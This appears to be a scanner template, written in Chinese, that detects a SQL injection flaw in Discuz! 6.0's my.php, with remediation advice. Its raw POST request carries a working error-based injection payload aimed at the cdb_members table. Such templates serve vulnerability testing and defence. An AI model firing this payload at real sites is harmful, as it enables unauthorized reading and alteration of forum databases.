id: discuz-sqli-my
info:
  name: discuz6.0 my.php sql注入
  author:
  - 折跃
  description: |-
    Discuz! 6.0 my.php SQL注入漏洞
    Discuz!是一套通用的社区论坛软件系统。

    Discuz! /upload/my.php存在SQL注入漏洞，攻击者可利用该漏洞执行SQL语句，对数据库中的信息进行查看、添加、修改或删除。
  severity: high
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：
    http://discuz.net/

    临时修复方案：
    1、使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。
    2、对进入数据库的特殊字符（’”<>&*;等）进行转义处理，或编码转换。
    3、确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。
    4、数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。
    5、网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。
    6、严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。
    7、避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。
    8、过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。
requests:
- matchers:
  - type: dsl
    condition: and
    dsl:
    - status_code==200
    - contains(body,'c4ca4238a0b923820dcc509a6f75849')
  raw:
  - |
    POST /upload/my.php?item=buddylist&descriptionnew[%27%20and(select%201%20from(select%20count(*),concat((select(select%20concat(0x7c,md5(1),0x7c,md5(1),0x7c)%20from%20cdb_members%20limit%200,1)%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23]=1 HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    formhash=698a7245&buddysubmit=%2525E6%25258F%252590%25252B%2525C2%2525A0%25252B%2525E4%2525BA%2525A4
  req-condition: true
variables:
  verify: '{{rand_text_alphanumeric(32,"")}}'
